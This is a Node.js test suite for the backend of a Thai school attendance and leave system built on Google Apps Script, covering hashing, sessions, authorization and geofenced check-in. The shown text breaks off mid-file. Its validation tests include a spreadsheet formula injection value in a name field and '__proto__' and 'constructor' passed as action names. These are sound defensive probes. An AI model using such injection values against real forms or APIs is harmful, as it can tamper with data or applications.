/**
 * backend.test.js — ทดสอบ Backend ทั้งระบบบน Apps Script simulator
 * รัน: node tests/backend.test.js
 * ผลการทดสอบถูกเขียนลง tests/results/backend-results.md
 */
'use strict';
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const assert = require('assert');
const { createGasEnv } = require('./gas-mock');

const SCHOOL = { lat: 18.7883, lng: 98.9853 };
const INSIDE = { lat: SCHOOL.lat + 0.0004, lng: SCHOOL.lng, accuracy: 12 };      // ~45 m
const OUTSIDE = { lat: SCHOOL.lat + 0.0025, lng: SCHOOL.lng, accuracy: 10 };     // ~278 m
const ADMIN_PW = 'Adm1nStrong2026';
const ADMIN_PW2 = 'Adm1nChanged2026';

const tests = [];
function test(id, name, fn) { tests.push({ id, name, fn }); }

/* ------------------------------------------------------------------ helpers */
function newSystem(opts = {}) {
  const env = createGasEnv({ printErrors: !!process.env.DEBUG });
  const ss = env.SpreadsheetApp.create('DB');
  env.state.activeSpreadsheetId = ss.getId();
  env.state.props.PBKDF2_ITERATIONS = '20000';
  env.clock.setBkk(opts.now || '2026-11-09 07:00:00'); // จันทร์
  env.call('SetupSystem');
  // ข้ามวันในการทดสอบ Session จะหมดอายุจริง (CacheService เก็บได้สูงสุด 6 ชม.)
  // → สถานการณ์หลายวันจะเข้าสู่ระบบใหม่อัตโนมัติด้วยข้อมูลบัญชีเดิม
  const creds = {}, alias = {};
  const resolve = (tk) => { while (typeof tk === 'string' && alias[tk]) tk = alias[tk]; return tk; };
  const sys = {
    env,
    creds,
    api: (token, action, params) => {
      const cur = resolve(token);
      let r = env.call('api', cur, action, params || {});
      if (action === 'auth.logout' && r.ok) delete creds[cur];
      if (!opts.realSessions && r.code === 'AUTH' && creds[cur] && action !== 'auth.logout') {
        const l = env.call('login', creds[cur].u, creds[cur].p, { ua: 'test-relogin' });
        if (l.ok) {
          alias[cur] = l.data.token; creds[l.data.token] = creds[cur];
          r = env.call('api', l.data.token, action, params || {});
        }
      }
      return r;
    },
    login: (u, p) => {
      const r = env.call('login', u, p, { ua: 'test' });
      if (r.ok) creds[r.data.token] = { u, p };
      return r;
    },
    register: (f) => env.call('register', f),
    at: (s) => env.clock.setBkk(s)
  };
  if (opts.noAdmin) return sys;
  Object.assign(env.state.props, {
    BOOTSTRAP_ADMIN_USERNAME: 'admin.saohin', BOOTSTRAP_ADMIN_PASSWORD: ADMIN_PW,
    BOOTSTRAP_ADMIN_FULLNAME: 'นายผู้ดูแล ระบบโรงเรียน', BOOTSTRAP_ADMIN_STAFFCODE: 'ADM001'
  });
  env.call('CreateFirstAdmin');
  let r = sys.login('admin.saohin', ADMIN_PW);
  assert.ok(r.ok, JSON.stringify(r));
  r = sys.api(r.data.token, 'auth.changePassword', { currentPassword: ADMIN_PW, newPassword: ADMIN_PW2, confirmPassword: ADMIN_PW2 });
  assert.ok(r.ok, JSON.stringify(r));
  sys.admin = r.data.token;
  creds[sys.admin] = { u: 'admin.saohin', p: ADMIN_PW2 };
  if (!opts.noGeo) {
    const s = sys.api(sys.admin, 'settings.save', { values: { SCHOOL_LAT: String(SCHOOL.lat), SCHOOL_LNG: String(SCHOOL.lng), SETTINGS_CONFIRMED: true } });
    assert.ok(s.ok, JSON.stringify(s));
  }
  if (!opts.realSessions) {
    // การทดสอบแบบสถานการณ์หลายวัน: ขยายอายุ Session (การหมดอายุจริงทดสอบใน L04)
    ok(sys.api(sys.admin, 'settings.save', { values: { SESSION_TIMEOUT_MIN: '360' } }));
    env.context.AUTH_.MAX_SESSION_HOURS = 24 * 400;
  }
  return sys;
}

function regForm(n, extra) {
  return Object.assign({
    fullName: 'นางสาวครู ทดสอบที่' + ['หนึ่ง', 'สอง', 'สาม', 'สี่', 'ห้า', 'หก'][n - 1],
    staffCode: 'T00' + n, position: 'ครู', username: 'teacher' + n,
    password: 'Teach3rPass' + n, confirmPassword: 'Teach3rPass' + n, acceptPrivacy: true
  }, extra || {});
}

/** สมัคร + อนุมัติ + เข้าสู่ระบบ → token */
function addTeacher(sys, n, role) {
  let r = sys.register(regForm(n));
  assert.ok(r.ok, JSON.stringify(r));
  const id = r.data.reference;
  r = sys.api(sys.admin, 'emp.approve', { employeeId: id, role: role || 'USER' });
  assert.ok(r.ok, JSON.stringify(r));
  r = sys.login('teacher' + n, 'Teach3rPass' + n);
  assert.ok(r.ok, JSON.stringify(r));
  return { token: r.data.token, id, username: 'teacher' + n };
}

function sheet(sys, name) { return sys.env.SpreadsheetApp.openById(sys.env.state.props.SPREADSHEET_ID).getSheetByName(name); }
function records(sys, name) { return sheet(sys, name)._records(); }
function expectErr(r, code) {
  assert.strictEqual(r.ok, false, 'expected error ' + code + ' got ' + JSON.stringify(r).slice(0, 300));
  if (code) assert.strictEqual(r.code, code, 'expected code ' + code + ' got ' + r.code + ': ' + r.error);
  return r;
}
function ok(r) { assert.strictEqual(r.ok, true, JSON.stringify(r).slice(0, 400)); return r.data; }

/* ================================================================== SETUP */
test('S01', 'SetupSystem สร้างชีตครบ 9 ชีตพร้อม Header, ค่าตั้งต้น, Pepper, โฟลเดอร์ Drive, Trigger', () => {
  const sys = newSystem({ noAdmin: true });
  const ss = sys.env.SpreadsheetApp.openById(sys.env.state.props.SPREADSHEET_ID);
  const names = ss.getSheets().map(s => s.getName()).filter(n => n !== 'เริ่มต้นใช้งาน').sort();
  assert.deepStrictEqual(names, ['AttendanceLogs', 'AuditLogs', 'CorrectionRequests', 'DailySummary', 'Employees', 'LeaveRequests', 'Sessions', 'Settings', 'WorkCalendar'].sort());
  const emp = sheet(sys, 'Employees').getRange(1, 1, 1, 19).getValues()[0];
  assert.strictEqual(emp[0], 'EmployeeID');
  assert.ok(emp.includes('PasswordHash') && emp.includes('SessionVersion'));
  const settings = records(sys, 'Settings');
  assert.strictEqual(settings.find(s => s.Key === 'GEOFENCE_RADIUS_M').Value, '150');
  assert.strictEqual(settings.find(s => s.Key === 'MAX_GPS_ACCURACY_M').Value, '50');
  assert.ok(/^[a-f0-9]{64}$/.test(sys.env.state.props.PASSWORD_PEPPER));
  assert.ok(sys.env.state.props.ATTACHMENT_FOLDER_ID && sys.env.state.props.EXPORT_FOLDER_ID);
  assert.strictEqual(sys.env.state.triggers.filter(t => t.fn === 'DailyMaintenance').length, 1);
  // ยังไม่มีผู้ดูแลระบบ → มีรหัสติดตั้งในชีต "เริ่มต้นใช้งาน" (เห็นเฉพาะเจ้าของไฟล์)
  const code = sys.env.state.props.SETUP_CODE;
  assert.ok(/^[A-Z2-9]{4}-[A-Z2-9]{4}-[A-Z2-9]{4}$/.test(code), code);
  assert.ok(JSON.stringify(sheet(sys, 'เริ่มต้นใช้งาน').rows).includes(code));
});

test('S02', 'เรียก SetupSystem ซ้ำ: ไม่สร้างชีตซ้ำ ไม่ลบข้อมูลเดิม ไม่เปลี่ยน Pepper', () => {
  const sys = newSystem();
  const pepper = sys.env.state.props.PASSWORD_PEPPER;
  const before = records(sys, 'Employees').length;
  const settingsBefore = records(sys, 'Settings').length;
  sys.env.call('SetupSystem');
  sys.env.call('SetupSystem');
  assert.strictEqual(records(sys, 'Employees').length, before);
  assert.strictEqual(records(sys, 'Settings').length, settingsBefore);
  assert.strictEqual(sys.env.state.props.PASSWORD_PEPPER, pepper);
  assert.strictEqual(sys.env.state.triggers.length, 1);
  assert.ok(ok(sys.login('admin.saohin', ADMIN_PW2)).token);
});

test('S03', 'SetupSystem เพิ่มคอลัมน์ที่ขาด (อัปเกรด) โดยคงข้อมูลเดิม', () => {
  const sys = newSystem();
  const sh = sheet(sys, 'WorkCalendar');
  // จำลองชีตรุ่นเก่า: ลบคอลัมน์ CreatedAt (คอลัมน์สุดท้าย)
  sh.rows.forEach(r => { r.length = 4; });
  sh.write(2, 1, "'2026-12-25"); sh.write(2, 2, "'SPECIAL_HOLIDAY"); sh.write(2, 3, "'ทดสอบ"); sh.write(2, 4, "'x");
  const log = sys.env.call('SetupSystem');
  assert.ok(/WorkCalendar \(เพิ่มคอลัมน์: CreatedAt\)/.test(log), log);
  const rec = records(sys, 'WorkCalendar');
  assert.strictEqual(rec[0].Date, '2026-12-25');
  assert.strictEqual(rec[0].Title, 'ทดสอบ');
});

test('S04', 'ฟังก์ชันผู้พัฒนา (SetupSystem/CreateFirstAdmin/EmergencyResetAdmin/Benchmark) เรียกจากเว็บไม่ได้', () => {
  const sys = newSystem({ noAdmin: true });
  sys.env.state.activeEmail = ''; // ผู้ใช้ทั่วไปเปิดเว็บแอป (Execute as: Me)
  for (const fn of ['SetupSystem', 'CreateFirstAdmin', 'EmergencyResetAdmin', 'BenchmarkPasswordHashing']) {
    assert.throws(() => sys.env.call(fn), /Apps Script Editor/, fn);
  }
  sys.env.state.activeEmail = 'someone.else@example.com';
  assert.throws(() => sys.env.call('SetupSystem'), /Apps Script Editor/);
});

/* ================================================================== CRYPTO */
test('C01', 'PBKDF2-HMAC-SHA256 (JavaScript) ตรงกับ Node.js crypto ทุกกรณี', () => {
  const sys = newSystem({ noAdmin: true });
  const c = sys.env.context;
  for (const [pw, saltLen, it] of [['password', 16, 1], ['password', 16, 2], ['รหัสผ่านภาษาไทย123', 16, 1000], ['x'.repeat(100), 32, 777]]) {
    const pwb = [...Buffer.from(pw, 'utf8')], salt = [...crypto.randomBytes(saltLen)];
    const mine = Buffer.from(c.pbkdf2Sha256_(pwb, salt, it)).toString('hex');
    const ref = crypto.pbkdf2Sync(Buffer.from(pwb), Buffer.from(salt), it, 32, 'sha256').toString('hex');
    assert.strictEqual(mine, ref, `pw=${pw} it=${it}`);
  }
  // RFC 7914 §11 test vector: PBKDF2-HMAC-SHA256("passwd","salt",1,64) first 32 bytes
  const v = Buffer.from(c.pbkdf2Sha256_([...Buffer.from('passwd')], [...Buffer.from('salt')], 1)).toString('hex');
  assert.strictEqual(v, '55ac046e56e3089fec1691c22544b605f94185216dde0465e68b9d57c20dacbc');
});

test('C02', 'รหัสผ่านเก็บเป็น Hash+Salt ไม่มีรหัสผ่านจริงในฐานข้อมูล/Audit/Sessions', () => {
  const sys = newSystem();
  addTeacher(sys, 1);
  const dump = JSON.stringify([...sys.env.state.spreadsheets.values()].map(s => s.sheets.map(x => x.rows)));
  for (const pw of [ADMIN_PW, ADMIN_PW2, 'Teach3rPass1']) assert.ok(!dump.includes(pw), 'plaintext found: ' + pw);
  const hashes = records(sys, 'Employees').map(e => e.PasswordHash);
  hashes.forEach(h => assert.ok(/^pbkdf2_sha256\$20000\$[A-Za-z0-9+/=]+\$[A-Za-z0-9+/=]+$/.test(h), h));
  assert.notStrictEqual(hashes[0].split('$')[2], hashes[1].split('$')[2], 'salt must differ');
  assert.ok(!('BOOTSTRAP_ADMIN_PASSWORD' in sys.env.state.props), 'bootstrap password must be deleted');
});

test('C03', 'Pepper เป็นส่วนหนึ่งของ Hash: ถ้าไม่มี Pepper ที่ถูกต้อง Hash ใช้ตรวจรหัสผ่านไม่ได้', () => {
  const sys = newSystem();
  const c = sys.env.context;
  const h = c.hashPassword_('Secret123abc');
  assert.ok(c.verifyPassword_('Secret123abc', h).ok);
  assert.ok(!c.verifyPassword_('Secret123abd', h).ok);
  sys.env.state.props.PASSWORD_PEPPER = 'f'.repeat(64);
  c.resetMemo_();
  assert.ok(!c.verifyPassword_('Secret123abc', h).ok);
});

test('C04', 'รหัสผ่านชั่วคราวสุ่มใหม่ทุกครั้ง ยาว 12 ตัว มีตัวพิมพ์ใหญ่/เล็ก/ตัวเลข', () => {
  const sys = newSystem({ noAdmin: true });
  const seen = new Set();
  for (let i = 0; i < 200; i++) {
    const p = sys.env.context.generateTempPassword_(12);
    assert.ok(p.length === 12 && /[A-Z]/.test(p) && /[a-z]/.test(p) && /[2-9]/.test(p), p);
    assert.strictEqual(sys.env.context.passwordPolicyError_(p, 'user'), '');
    seen.add(p);
  }
  assert.strictEqual(seen.size, 200);
});

/* ================================================================== BOOTSTRAP */
test('B01', 'CreateFirstAdmin: ต้องตั้ง Script Properties, สร้าง ADMIN + บังคับเปลี่ยนรหัสผ่าน, รันซ้ำไม่ได้', () => {
  const sys = newSystem({ noAdmin: true });
  assert.throws(() => sys.env.call('CreateFirstAdmin'), /BOOTSTRAP_ADMIN_USERNAME/);
  Object.assign(sys.env.state.props, { BOOTSTRAP_ADMIN_USERNAME: 'boss', BOOTSTRAP_ADMIN_PASSWORD: 'weak', BOOTSTRAP_ADMIN_FULLNAME: 'นายหัวหน้า ทดสอบ', BOOTSTRAP_ADMIN_STAFFCODE: 'A1' });
  assert.throws(() => sys.env.call('CreateFirstAdmin'), /ไม่ถูกต้อง/);
  sys.env.state.props.BOOTSTRAP_ADMIN_PASSWORD = 'Chief2026Strong';
  sys.env.call('CreateFirstAdmin');
  const e = records(sys, 'Employees')[0];
  assert.strictEqual(e.Role, 'ADMIN'); assert.strictEqual(e.Status, 'ACTIVE'); assert.strictEqual(e.MustChangePassword, true);
  assert.ok(!('BOOTSTRAP_ADMIN_PASSWORD' in sys.env.state.props));
  assert.ok(!('SETUP_CODE' in sys.env.state.props) && !sheet(sys, 'เริ่มต้นใช้งาน'), 'setup code must be removed');
  sys.env.state.props.BOOTSTRAP_ADMIN_PASSWORD = 'Chief2026Strong';
  assert.throws(() => sys.env.call('CreateFirstAdmin'), /มีผู้ดูแลระบบที่ใช้งานอยู่แล้ว/);
});

test('B02', 'Admin เข้าสู่ระบบครั้งแรก: ถูกบังคับเปลี่ยนรหัสผ่านก่อนใช้งานฟังก์ชันอื่น', () => {
  const sys = newSystem({ noAdmin: true });
  Object.assign(sys.env.state.props, { BOOTSTRAP_ADMIN_USERNAME: 'boss', BOOTSTRAP_ADMIN_PASSWORD: 'Chief2026Strong', BOOTSTRAP_ADMIN_FULLNAME: 'นายหัวหน้า ทดสอบ', BOOTSTRAP_ADMIN_STAFFCODE: 'A1' });
  sys.env.call('CreateFirstAdmin');
  const d = ok(sys.login('boss', 'Chief2026Strong'));
  assert.strictEqual(d.mustChangePassword, true);
  expectErr(sys.api(d.token, 'emp.list', {}), 'MUST_CHANGE_PASSWORD');
  expectErr(sys.api(d.token, 'me.dashboard', {}), 'MUST_CHANGE_PASSWORD');
  ok(sys.api(d.token, 'auth.session', {}));
  expectErr(sys.api(d.token, 'auth.changePassword', { currentPassword: 'Chief2026Strong', newPassword: 'Chief2026Strong', confirmPassword: 'Chief2026Strong' }), 'VALIDATION');
  const c = ok(sys.api(d.token, 'auth.changePassword', { currentPassword: 'Chief2026Strong', newPassword: 'NewChief2026x', confirmPassword: 'NewChief2026x' }));
  expectErr(sys.api(d.token, 'auth.session', {}), 'AUTH'); // token เดิมใช้ไม่ได้
  assert.ok(Array.isArray(ok(sys.api(c.token, 'emp.list', {}))));
});

test('B03', 'EmergencyResetAdmin กู้คืนสิทธิ์ผู้ดูแลระบบจาก Editor ได้', () => {
  const sys = newSystem();
  Object.assign(sys.env.state.props, { BOOTSTRAP_ADMIN_USERNAME: 'admin.saohin', BOOTSTRAP_ADMIN_PASSWORD: 'Recover2026ok' });
  sys.env.call('EmergencyResetAdmin');
  expectErr(sys.api(sys.admin, 'emp.list', {}), 'AUTH');
  const d = ok(sys.login('admin.saohin', 'Recover2026ok'));
  assert.strictEqual(d.mustChangePassword, true);
  assert.ok(!('BOOTSTRAP_ADMIN_PASSWORD' in sys.env.state.props));
});

/* ================================================================== REGISTRATION */
test('R01', 'สมัครสมาชิก: ตรวจสอบข้อมูลไม่ถูกต้องทุกกรณี', () => {
  const sys = newSystem();
  const cases = [
    [{ password: 'short1', confirmPassword: 'short1' }, 'password'],
    [{ password: 'abcdefghij', confirmPassword: 'abcdefghij' }, 'password'],
    [{ password: '12345678', confirmPassword: '12345678' }, 'password'],
    [{ password: 'Password123', confirmPassword: 'Password123' }, 'password'],
    [{ password: 'teacher1Abc', confirmPassword: 'teacher1Abc' }, 'password'],
    [{ confirmPassword: 'Different99' }, 'confirmPassword'],
    [{ username: 'ab' }, 'username'],
    [{ username: '1abc' }, 'username'],
    [{ username: 'ครูไทย' }, 'username'],
    [{ fullName: 'สมชาย' }, 'fullName'],
    [{ fullName: '=HYPERLINK("x") ทดสอบ' }, 'fullName'],
    [{ staffCode: 'รหัส' }, 'staffCode'],
    [{ position: 'ภารโรง' }, 'position'],
    [{ acceptPrivacy: false }, 'acceptPrivacy']
  ];
  cases.forEach(([patch, field]) => {
    const r = expectErr(sys.register(regForm(1, patch)), 'VALIDATION');
    assert.strictEqual(r.data && r.data.field, field, JSON.stringify(patch) + ' → ' + r.error);
  });
  assert.strictEqual(records(sys, 'Employees').length, 1);
});

test('R02', 'สมัครสำเร็จ → PENDING; Username/รหัสบุคลากรซ้ำ (ไม่สนตัวพิมพ์) ถูกปฏิเสธ; รหัส 00123 ไม่ถูกแปลงเป็นตัวเลข', () => {
  const sys = newSystem();
  const d = ok(sys.register(regForm(1, { staffCode: '00123' })));
  assert.ok(/รอการอนุมัติ/.test(d.message));
  const e = records(sys, 'Employees').find(x => x.Username === 'teacher1');
  assert.strictEqual(e.Status, 'PENDING'); assert.strictEqual(e.Role, 'USER'); assert.strictEqual(e.StaffCode, '00123');
  expectErr(sys.register(regForm(2, { username: 'TEACHER1' })), 'DUPLICATE');
  expectErr(sys.register(regForm(2, { staffCode: '00123' })), 'DUPLICATE');
  ok(sys.register(regForm(2)));
});

test('R03', 'บัญชีรออนุมัติ/ไม่อนุมัติ เข้าสู่ระบบไม่ได้และได้รับข้อความชัดเจน', () => {
  const sys = newSystem();
  const id = ok(sys.register(regForm(1))).reference;
  expectErr(sys.login('teacher1', 'Teach3rPass1'), 'PENDING');
  ok(sys.api(sys.admin, 'emp.reject', { employeeId: id, note: 'ข้อมูลไม่ถูกต้อง' }));
  expectErr(sys.login('teacher1', 'Teach3rPass1'), 'REJECTED');
});

test('R04', 'ปิดรับสมัครสมาชิกจากหน้าตั้งค่าได้', () => {
  const sys = newSystem();
  ok(sys.api(sys.admin, 'settings.save', { values: { ALLOW_REGISTRATION: false } }));
  expectErr(sys.register(regForm(1)), 'CLOSED');
  assert.strictEqual(ok(sys.env.call('getPublicConfig')).allowRegistration, false);
});

/* ================================================================== LOGIN / SESSION */
test('L01', 'รหัสผ่านผิด/ไม่มีผู้ใช้ ได้ข้อความเดียวกัน (ไม่เปิดเผยว่ามีบัญชีหรือไม่)', () => {
  const sys = newSystem();
  const a = expectErr(sys.login('admin.saohin', 'WrongPass123'), 'INVALID_LOGIN');
  const b = expectErr(sys.login('nobody.here', 'WrongPass123'), 'INVALID_LOGIN');
  assert.strictEqual(a.error, b.error);
  assert.ok(/เหลือโอกาสอีก 4 ครั้ง/.test(a.error));
});

test('L02', 'ล็อกบัญชีชั่วคราวเมื่อใส่รหัสผิด 5 ครั้ง, ปลดล็อกเมื่อครบเวลา หรือ Admin ปลดล็อก', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  for (let i = 0; i < 4; i++) expectErr(sys.login('teacher1', 'Wrong' + i + 'abc'), 'INVALID_LOGIN');
  expectErr(sys.login('teacher1', 'Wrong9abc'), 'LOCKED');
  expectErr(sys.login('teacher1', 'Teach3rPass1'), 'LOCKED'); // รหัสถูกก็เข้าไม่ได้ขณะล็อก
  const list = ok(sys.api(sys.admin, 'emp.list', {}));
  assert.strictEqual(list.find(e => e.employeeId === t.id).locked, true);
  ok(sys.api(sys.admin, 'emp.unlock', { employeeId: t.id }));
  ok(sys.login('teacher1', 'Teach3rPass1'));
  for (let i = 0; i < 5; i++) sys.login('teacher1', 'Wrong' + i + 'abc');
  sys.env.clock.advanceMinutes(16);
  ok(sys.login('teacher1', 'Teach3rPass1'));
  assert.ok(records(sys, 'AuditLogs').some(l => l.Action === 'LOGIN_LOCKED'));
});

test('L03', 'Token ปลอม/ว่าง/รูปแบบผิด ถูกปฏิเสธ', () => {
  const sys = newSystem();
  for (const tk of ['', null, 'abc', 'a'.repeat(64), sys.admin.slice(0, 63) + 'x', { x: 1 }]) {
    expectErr(sys.api(tk, 'me.dashboard', {}), 'AUTH');
  }
});

test('L04', 'Session หมดอายุเมื่อไม่ใช้งานเกิน 30 นาที (sliding) และไม่เกิน 12 ชั่วโมง', () => {
  const sys = newSystem({ realSessions: true });
  const t = addTeacher(sys, 1);
  for (let i = 0; i < 3; i++) { sys.env.clock.advanceMinutes(25); ok(sys.api(t.token, 'auth.ping', {})); }
  sys.env.clock.advanceMinutes(31);
  expectErr(sys.api(t.token, 'auth.ping', {}), 'AUTH');
  const t2 = ok(sys.login('teacher1', 'Teach3rPass1')).token;
  for (let i = 0; i < 26; i++) { sys.env.clock.advanceMinutes(28); if (i < 25) ok(sys.api(t2, 'auth.ping', {})); }
  expectErr(sys.api(t2, 'auth.ping', {}), 'AUTH'); // > 12 ชม.
});

test('L05', 'ออกจากระบบแล้ว Token เดิมใช้ไม่ได้ และบันทึกเวลาออกใน Sessions', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  ok(sys.api(t.token, 'auth.logout', {}));
  expectErr(sys.api(t.token, 'me.dashboard', {}), 'AUTH');
  const s = records(sys, 'Sessions').filter(x => x.Username === 'teacher1');
  assert.ok(s.some(x => x.EndReason === 'LOGOUT' && x.LogoutAt));
});

test('L06', 'ปิดใช้งานบัญชี/รีเซ็ตรหัสผ่าน มีผลทันทีกับ Session ที่ค้างอยู่', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  ok(sys.api(t.token, 'me.dashboard', {}));
  ok(sys.api(sys.admin, 'emp.setStatus', { employeeId: t.id, status: 'INACTIVE' }));
  expectErr(sys.api(t.token, 'me.dashboard', {}), 'AUTH');
  expectErr(sys.login('teacher1', 'Teach3rPass1'), 'INACTIVE');
  ok(sys.api(sys.admin, 'emp.setStatus', { employeeId: t.id, status: 'ACTIVE' }));
  const tok = ok(sys.login('teacher1', 'Teach3rPass1')).token;
  const rp = ok(sys.api(sys.admin, 'emp.resetPassword', { employeeId: t.id }));
  expectErr(sys.api(tok, 'me.dashboard', {}), 'AUTH');
  expectErr(sys.login('teacher1', 'Teach3rPass1'), 'INVALID_LOGIN');
  const d = ok(sys.login('teacher1', rp.tempPassword));
  assert.strictEqual(d.mustChangePassword, true);
});

/* ================================================================== AUTHORIZATION */
test('A01', 'บุคลากรทั่วไปเรียกคำสั่ง Admin/ผู้บริหารทุกคำสั่ง → FORBIDDEN และบันทึก ACCESS_DENIED', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  const routes = sys.env.context.getRoutes_();
  const restricted = Object.keys(routes).filter(k => routes[k].roles);
  assert.ok(restricted.length >= 30);
  restricted.forEach(a => expectErr(sys.api(t.token, a, {}), 'FORBIDDEN'));
  const denied = records(sys, 'AuditLogs').filter(l => l.Action === 'ACCESS_DENIED').length;
  assert.strictEqual(denied, restricted.length);
});

test('A02', 'ผู้บริหาร (EXECUTIVE) ดูรายงาน/อนุมัติการลาได้ แต่จัดการสมาชิก/ตั้งค่า/Audit ไม่ได้', () => {
  const sys = newSystem();
  const ex = addTeacher(sys, 1, 'EXECUTIVE');
  ok(sys.api(ex.token, 'admin.overview', {}));
  ok(sys.api(ex.token, 'report.daily', { date: '2026-11-09' }));
  ok(sys.api(ex.token, 'leave.adminList', {}));
  ok(sys.api(ex.token, 'admin.view', {}));
  ['emp.list', 'emp.create', 'emp.resetPassword', 'settings.get', 'settings.save', 'audit.list', 'cal.add', 'sys.rebuildSummary']
    .forEach(a => expectErr(sys.api(ex.token, a, {}), 'FORBIDDEN'));
});

test('A03', 'ฟังก์ชันที่ Browser เรียกได้ (ไม่ลงท้าย _) มีเฉพาะรายการที่กำหนด', () => {
  const sys = newSystem({ noAdmin: true });
  const c = sys.env.context;
  const injected = ['Date', 'Intl']; // global ที่ simulator ใส่ให้ ไม่ใช่โค้ดของระบบ
  const publicFns = Object.keys(c).filter(k => typeof c[k] === 'function' && !k.endsWith('_') && !injected.includes(k)).sort();
  assert.deepStrictEqual(publicFns, ['BenchmarkPasswordHashing', 'CreateFirstAdmin', 'DailyMaintenance', 'EmergencyResetAdmin',
    'SetupSystem', 'api', 'doGet', 'firstRunSetup', 'getPublicConfig', 'include', 'login', 'register'].sort());
  assert.throws(() => sys.env.call('recordAttendance_'), /Private/);
});

test('A04', 'คำสั่งที่ไม่รู้จัก/พารามิเตอร์ผิดรูปแบบ ถูกปฏิเสธ', () => {
  const sys = newSystem();
  expectErr(sys.api(sys.admin, 'emp.dropTable', {}), 'BAD_REQUEST');
  expectErr(sys.api(sys.admin, '__proto__', {}), 'BAD_REQUEST');
  expectErr(sys.api(sys.admin, 'constructor', {}), 'BAD_REQUEST');
  expectErr(sys.env.call('api', sys.admin, 'me.dashboard', [1, 2]), 'BAD_REQUEST');
});

test('A05', 'include() คืนค่าเฉพาะไฟล์ที่อนุญาต (หน้า Admin โหลดผ่าน api ที่ตรวจสิทธิ์เท่านั้น)', () => {
  const sys = newSystem();
  assert.strictEqual(sys.env.call('include', 'AdminDashboard'), '');
  assert.strictEqual(sys.env.call('include', 'AdminScript'), '');
  if ((process.env.GAS_SRC || 'src') === 'src') assert.ok(sys.env.call('include', 'Styles').length > 100);
  const t = addTeacher(sys, 1);
  expectErr(sys.api(t.token, 'admin.view', {}), 'FORBIDDEN');
  const v = ok(sys.api(sys.admin, 'admin.view', {}));
  assert.ok(v.html.length > 500 && (v.script.length > 500 || v.html.includes('window.Admin = ')));
});

test('A06', 'บุคลากรไม่สามารถเข้าถึงข้อมูล/ไฟล์แนบ/ใบลาของผู้อื่น', () => {
  const sys = newSystem();
  sys.at('2026-11-09 07:30:00');
  const a = addTeacher(sys, 1), b = addTeacher(sys, 2);
  const pdf = Buffer.from('%PDF-1.4 test').toString('base64');
  const lv = ok(sys.api(a.token, 'leave.submit', { type: 'SICK', startDate: '2026-11-10', endDate: '2026-11-10', reason: 'ไม่สบาย', attachment: { name: 'cert.pdf', mimeType: 'application/pdf', data: pdf } })).leave;
  expectErr(sys.api(b.token, 'file.get', { kind: 'leave', id: lv.leaveId }), 'FORBIDDEN');
  expectErr(sys.api(b.token, 'leave.cancel', { leaveId: lv.leaveId }), 'NOT_FOUND');
  assert.strictEqual(ok(sys.api(b.token, 'leave.my', {})).length, 0);
  assert.strictEqual(ok(sys.api(a.token, 'file.get', { kind: 'leave', id: lv.leaveId })).base64, pdf);
  assert.strictEqual(ok(sys.api(sys.admin, 'file.get', { kind: 'leave', id: lv.leaveId })).name, 'cert.pdf');
  const dashB = ok(sys.api(b.token, 'me.dashboard', {}));
  assert.strictEqual(dashB.profile.username, 'teacher2');
});

/* ================================================================== ATTENDANCE */
test('T01', 'ยังไม่ตั้งค่าพิกัดโรงเรียน → ลงเวลาไม่ได้', () => {
  const sys = newSystem({ noGeo: true });
  const t = addTeacher(sys, 1);
  expectErr(sys.api(t.token, 'att.checkIn', INSIDE), 'GEOFENCE_NOT_SET');
});

test('T02', 'ลงเวลาเข้างานในรัศมี: ใช้เวลา Server (ไม่สนเวลาจาก Browser), คำนวณระยะ Haversine, บันทึกครบทุก field', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  sys.at('2026-11-09 07:45:12');
  const d = ok(sys.api(t.token, 'att.checkIn', Object.assign({ time: '06:00:00', date: '2020-01-01', employeeId: 'EMP-FAKE', status: 'ON_TIME' }, INSIDE)));
  assert.strictEqual(d.time, '07:45:12'); assert.strictEqual(d.date, '2026-11-09'); assert.strictEqual(d.status, 'ON_TIME');
  assert.ok(d.distanceM >= 43 && d.distanceM <= 46, d.distanceM);
  assert.ok(/openstreetmap\.org/.test(d.maps.osm) && /google\.com\/maps/.test(d.maps.google));
  const log = records(sys, 'AttendanceLogs')[0];
  ['AttendanceID', 'EmployeeID', 'FullName', 'Type', 'Date', 'Time', 'Latitude', 'Longitude', 'Accuracy', 'DistanceM', 'Status'].forEach(k => assert.notStrictEqual(log[k], '', k));
  assert.strictEqual(log.EmployeeID, t.id); assert.strictEqual(log.Date, '2026-11-09'); assert.strictEqual(log.Type, 'IN');
  assert.strictEqual(typeof log.Latitude, 'number'); assert.strictEqual(log.Source, 'GPS'); assert.strictEqual(log.IsActive, true);
});

test('T03', 'ลงเวลาเข้าซ้ำในวันเดียวกัน → ปฏิเสธ (1 วัน เข้าได้ 1 ครั้ง)', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  sys.at('2026-11-09 07:45:00');
  ok(sys.api(t.token, 'att.checkIn', INSIDE));
  sys.at('2026-11-09 07:45:01');
  expectErr(sys.api(t.token, 'att.checkIn', INSIDE), 'DUPLICATE');
  assert.strictEqual(records(sys, 'AttendanceLogs').length, 1);
  sys.at('2026-11-10 07:40:00');
  ok(sys.api(t.token, 'att.checkIn', INSIDE)); // วันใหม่ลงได้
});

test('T04', 'ลงเวลาออกก่อนลงเวลาเข้า → ปฏิเสธ; ออกงานสำเร็จแล้วออกซ้ำ → ปฏิเสธ', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  sys.at('2026-11-09 16:40:00');
  expectErr(sys.api(t.token, 'att.checkOut', INSIDE), 'NO_CHECKIN');
  sys.at('2026-11-10 07:50:00');
  ok(sys.api(t.token, 'att.checkIn', INSIDE));
  sys.at('2026-11-10 16:45:00');
  const out = ok(sys.api(t.token, 'att.checkOut', INSIDE));
  assert.strictEqual(out.status, 'NORMAL');
  expectErr(sys.api(t.token, 'att.checkOut', INSIDE), 'DUPLICATE');
  const sum = records(sys, 'DailySummary').find(s => s.Date === '2026-11-10');
  assert.strictEqual(sum.CheckInTime, '07:50:00'); assert.strictEqual(sum.CheckOutTime, '16:45:00'); assert.strictEqual(sum.WorkMinutes, 535);
});

test('T05', 'อยู่นอกรัศมี → ไม่บันทึก แจ้งระยะห่าง และบันทึก Audit (ไม่เก็บพิกัด)', () => {
  const sys = newSystem();
